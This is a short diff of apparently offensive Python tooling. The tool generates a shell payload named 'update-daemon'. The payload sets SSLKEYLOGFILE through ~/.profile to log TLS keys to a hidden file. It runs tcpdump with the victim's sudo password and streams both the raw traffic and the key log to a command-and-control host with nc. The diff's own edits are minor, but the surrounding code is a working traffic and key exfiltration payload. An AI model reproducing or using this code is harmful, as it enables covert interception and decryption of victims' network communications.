@@ -309,14 +309,13 @@ def tcp_payloads():
             touch /tmp/.update.log ; echo "export SSLKEYLOGFILE=/tmp/.update.log" >> ~/.profile ; source ~/.profile &
             sleep 5
             #gnome-session-quit --no-prompt
-            #reset
             source ~/.profile
             echo "{sudo_pw}" | sudo -S tcpdump -s0 -U -n -w - | nc {thief.c2} {thief.traffic_port} &
             tail -f /tmp/.update.log | nc {thief.c2} {thief.keylog_port} &
             ''')
             payload.close()
         os.system(f'chmod 777 payloads/update-daemon')
-        repl.success('Payload is ready in payloads directory...')
+        repl.success('Payload is ready in payloads directory as "update-daemon"...')
     elif thief.module == 'windows-tcp':
         # payload in progress
         pass
